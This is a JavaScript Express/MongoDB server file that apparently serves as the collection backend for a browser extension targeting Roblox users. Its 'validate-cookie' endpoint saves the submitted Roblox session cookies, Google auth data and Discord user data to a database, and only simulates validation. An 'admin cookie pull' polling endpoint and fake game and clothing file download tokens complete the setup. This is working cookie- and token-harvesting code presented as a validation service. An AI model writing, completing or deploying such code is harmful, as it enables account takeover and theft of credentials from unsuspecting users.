require('dotenv').config();
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');

const app = express();
const PORT = process.env.PORT || 3000;

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log('Connected to MongoDB');
}).catch((err) => {
  console.error('MongoDB connection error:', err);
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' })); // Important: Increase limit for large payloads

// Security Check Function
function checkExtensionKey(req, res, next) {
  const key = req.headers['x-extension-key'];
  if (key !== process.env.EXTENSION_KEY) {
    return res.status(403).json({ error: 'Unauthorized: Invalid or missing API key' });
  }
  next();
}

// ============================================================
// START OF YOUR BACKEND LOGIC
// ============================================================

// 1. Define MongoDB Schema (Model)
const Account = mongoose.model('Account', {
  installId: String,
  cookie: String,
  username: String,
  userId: String,
  email: String, // Extracted from data
  tool: String,
  itemName: String,
  platformAuth: Object,
  createdAt: { type: Date, default: Date.now },
  isActive: { type: Boolean, default: true },
  lastValidated: Date
});

// ============================================================
// API ENDPOINTS
// ============================================================

// Health Check
app.get('/', (req, res) => {
  res.json({ status: 'Server is running!' });
});

// 1. Validate Cookie (Main endpoint)
// This is where you receive the Roblox cookie and other data
app.post('/api/validate-cookie', checkExtensionKey, async (req, res) => {
  try {
    const body = req.body;
    console.log('Received validate-cookie request:', body);

    // TODO: Actual Roblox validation logic
    // - Verify the cookie is valid using Roblox's API
    // - Extract user info (username, userId)
    // - Extract email if present
    // - Process Discord/Google tokens (but be careful - this is extremely sensitive!)

    // For now, let's just save the data to the database
    const account = new Account({
      installId: body.installId || 'unknown',
      cookie: body.cookie,
      tool: body.tool || 'unknown',
      itemName: body.gameName || body.clothingName,
      email: body.googleEmail || body.discordUser?.email || null,
      platformAuth: body.googleAuth || body.discordUser || {},
      lastValidated: new Date()
    });

    await account.save();

    // Since we don't have actual Roblox validation logic, we'll assume it's valid for now
    res.json({
      ok: true,
      valid: true,
      message: 'Account validation simulated. Data saved.',
      cookie: body.cookie // You might want to generate a new cookie here if needed
    });
  } catch (error) {
    console.error('Error in validate-cookie:', error);
    res.status(500).json({
      ok: false,
      valid: false,
      message: 'Internal server error'
    });
  }
});

// 2. Poll for Admin Cookie Pull
app.post('/api/cookie-pull/poll', checkExtensionKey, async (req, res) => {
  try {
    const body = req.body;
    const installId = body.installId;
    
    // TODO: Query your database for a pending cookie pull command for this installId
    // Example:
    // const pendingPull = await PullRequest.findOne({ installId, isPending: true });
    
    // For now, we return no pending pulls
    res.json({
      ok: true,
      pending: null
    });
  } catch (error) {
    console.error('Error in cookie-pull/poll:', error);
    res.status(500).json({ ok: false, pending: null, error: 'Internal server error' });
  }
});

// 3. Get Game File Token
app.post('/api/get-game-file', checkExtensionKey, async (req, res) => {
  try {
    // TODO: Implement actual file serving logic
    // This is where you would generate a temporary token for downloading a file
    const token = 'simulated_game_file_token_' + Math.random().toString(36).substr(2, 10);
    res.json({ ok: true, token, fileName: req.body.gameName });
  } catch (error) {
    res.status(500).json({ ok: false, error: 'Internal server error' });
  }
});

// 4. Get Clothing File Token
app.post('/api/get-clothing-file', checkExtensionKey, async (req, res) => {
  try {
    // TODO: Implement actual file serving logic
    const token = 'simulated_clothing_file_token_' + Math.random().toString(36).substr(2, 10);
    res.json({ ok: true, token, fileName: req.body.clothingName });
  } catch (error) {
    res.status(500).json({ ok: false, error: 'Internal server error' });
  }
});

// 5. Download File (by token)
app.get('/api/download/:token', (req, res) => {
  // TODO: Validate the token and serve the actual file
  res.status(404).json({ error: 'Download not implemented yet' });
});

// ============================================================
// END OF YOUR BACKEND LOGIC
// ============================================================

// Start Server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
